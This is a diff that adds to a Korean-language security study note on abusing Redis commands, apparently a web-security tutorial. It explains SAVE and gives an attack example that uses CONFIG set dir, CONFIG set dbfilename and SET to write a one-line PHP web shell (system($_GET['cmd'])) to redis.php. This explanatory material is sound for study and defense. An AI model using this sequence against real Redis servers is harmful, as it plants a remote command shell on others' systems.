@@ -406,6 +406,20 @@
 <br/>
 
 * Redis 명령어를 이용한 공격
+    - **```SAVE```**: 메모리의 데이터를 파일 시스템에 저장할 때 사용하는 명령어 [🔗](https://redis.io/commands/save/)
+        | command | syntax | description |
+        |:---:|---|------|
+        | SAVE | ```SAVE``` | RDB 파일 형식으로 Redis 인스턴스 내부의 모든 데이터에 대한 특정 시점의 스냅샷을 생성하는 데이터 세트의 동기시적 저장(synchronous save)를 수행함 → 명령 성공 시 OK를 반환함 <br/> &nbsp;&nbsp; - 메모리의 데이터를 저장하는 파일의 저장 주기를 지정하거나 즉시 저장할 수 있음 <br/> &nbsp;&nbsp; - 저장되는 파일의 경로와 이름, 그리고 저장할 데이터를 함께 설정할 수 있음 |
+        + ⚠️ **```SAVE``` 명령어를 통해 Redis의 쓰기 권한이 있는 경로에 원하는 파일을 생성한 후 PHP 등의 다른 어플리케이션과 연계하여 공격을 수행할 수 있음**
+            - 공격 예시: ```SAVE``` 명령어를 이용한 WebShell 삽입
+                ```redis
+                CONFIG set dir /tmp
+                CONFIG set dbfilename redis.php
+                SET test "<?php system($_GET['cmd']); ?>"
+                SAVE
+                ```
+                + 파일 저장 경로(```dir```)를 ```/tmp```로, 파일 이름(```dbfilename```)을 ```redis.php```로 지정한 다음 셸을 실행하는 PHP 코드를 작성하고 이를 저장함(```SAVE```) <br/> &nbsp;&nbsp; → 성공적으로 실행되면 redis.php가 /tmp에 생성되고 공격자는 이를 통해서 PHP와 연계하여 공격을 수행할 수 있음
+    - **```SLAVEOF```/```REPLICAOF```**
 
 <br/><br/><br/>
 
